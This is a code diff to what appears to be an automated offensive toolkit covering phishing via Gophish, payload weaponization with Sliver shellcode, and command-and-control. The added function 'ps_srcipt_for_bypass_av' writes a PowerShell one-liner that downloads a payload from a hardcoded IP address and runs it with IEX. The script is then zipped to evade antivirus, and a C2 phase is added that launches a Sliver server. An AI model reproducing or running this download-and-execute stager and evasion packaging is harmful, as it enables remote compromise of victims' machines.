@@ -1,6 +1,7 @@
 import os
 import subprocess
 import csv
+import zipfile
 from dotenv import load_dotenv
 from tools.gophish.custom_gophish import custom_gophish
 
@@ -112,6 +113,8 @@ class weaponization:
         self.payload_template = "tools/sliver/payload_template.ps1"
         self.public_server_path = os.getenv("WEB_STAGER_PATH")
         self.public_payload_name = os.getenv("PAYLOAD_PS1")
+        self.fish = os.getenv("FISH_PS1")
+        self.payload_path = os.path.join(self.public_server_path, self.public_payload_name)
 
         self.shellcode = None
         self.payload = None
@@ -120,7 +123,8 @@ class weaponization:
         data_in_payload_file = self.load_payload_template(self.payload_template)
 
         self.update_shellcode_in_payload(data_in_shellcode_file, data_in_payload_file)
-        self.upload_to_website(os.path.join(self.public_server_path, self.public_payload_name))
+        self.upload_to_website(self.payload_path)
+        self.ps_srcipt_for_bypass_av(self.public_server_path, self.fish, self.public_payload_name)
         self.clear_phase()
 
         print('\n')
@@ -196,6 +200,39 @@ class weaponization:
         with open(file_path, 'w') as file:
             file.write(self.payload)
 
+    def ps_srcipt_for_bypass_av(directory, ps_name, payload_name):
+        # Content of the PowerShell script
+        ps_content = f"(new-object system.net.webclient).downloadstring('http://18.143.102.216/stagers/{payload_name}') | IEX"
+
+        # Create the PowerShell file
+        ps_file_path = os.path.join(directory, ps_name)
+        with open(ps_file_path, "w") as ps_file:
+            ps_file.write(ps_content)
+
+        # Create a zip file with the PowerShell script
+        zip_file_path = os.path.join(directory, f"{ps_name}.zip")
+        with zipfile.ZipFile(zip_file_path, 'w') as zipf:
+            zipf.write(ps_file_path, arcname=os.path.basename(ps_file_path))
+
+        # Remove the original PowerShell file
+        os.remove(ps_file_path)
+
+        return zip_file_path
+
+    def zip_ps1_file(self, ps1_file_path):
+        # Extract directory and file name from the given path
+        directory, file_name = os.path.split(ps1_file_path)
+
+        # Create a zip file with the same name as the PS1 file
+        zip_file_path = os.path.join(directory, f"{file_name}.zip")
+
+        # Create a ZipFile object to write to
+        with zipfile.ZipFile(zip_file_path, 'w') as zipf:
+            # Add the PS1 file to the zip archive
+            zipf.write(ps1_file_path, arcname=file_name)
+
+        return zip_file_path    
+
     def clear_phase(self):
         # check shell code
         # print(self.shellcode)
@@ -267,16 +304,16 @@ class c2:
     def kill_old_process(self):
         script_path = "./tools/sliver/kill_multiplayermod.sh"
         try:
-            # Run the shell script with the collected parameters
-            subprocess.run(["bash", script_path, 31337], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            subprocess.run(["bash", script_path, 1234], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            # Kill old multiplayer mode in previous sliver-server
+            subprocess.run(["bash", script_path, "31337"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["bash", script_path, "1234"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             print("Prepare success!")
 
         except subprocess.CalledProcessError as e:
             print(f"Error executing shell script: {e}")
 
     def start_sliver_server(self):
-        script_path = "run_custom_sliver.sh"
+        script_path = "./tools/sliver/run_custom_sliver.sh"
         try:
             # Change permissions of get_configs.sh to make it executable
             subprocess.run(["chmod", "+x", script_path], check=True)
@@ -297,6 +334,7 @@ def main():
     # list_phase.append(delivery())
     list_phase.append(exploitation())
     list_phase.append(installation())
+    list_phase.append(c2())
 
 if __name__ == '__main__':
     main()
